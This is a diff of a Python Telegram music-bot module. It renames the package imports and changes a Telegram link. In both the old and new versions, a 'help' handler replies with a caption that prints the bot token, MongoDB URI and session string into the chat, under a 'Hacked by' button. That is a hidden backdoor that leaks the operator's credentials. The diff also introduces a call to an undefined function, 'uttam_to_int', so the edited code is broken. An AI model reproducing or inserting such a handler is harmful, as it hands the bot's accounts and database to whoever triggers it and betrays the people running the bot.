@@ -13,12 +13,12 @@ from pyrogram import filters
 
 load_dotenv()
 
-from PURVIMUSIC import app
-from PURVIMUSIC.core.call import PURVI
-from PURVIMUSIC.misc import db
-from PURVIMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
-from PURVIMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
-from PURVIMUSIC.utils.formatters import alpha_to_int, get_readable_time
+from BABYMUSIC import app
+from BABYMUSIC.core.call import PURVI
+from BABYMUSIC.misc import db
+from BABYMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
+from BABYMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
+from BABYMUSIC.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -54,7 +54,7 @@ async def reload_admin_cache(client, message: Message, _):
                 adminlist[message.chat.id].append(user.user.id)
         authusers = await get_authuser_names(message.chat.id)
         for user in authusers:
-            user_id = await alpha_to_int(user)
+            user_id = await uttam_to_int(user)
             adminlist[message.chat.id].append(user_id)
         now = int(time.time()) + 180
         rel[message.chat.id] = now
@@ -113,12 +113,12 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_ALPHA_BABY_lll)............☆""",
+       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/uttam470)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/ll_ALPHA_BABY_lll")
+                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/uttam470")
                  ]
             ]
          ),
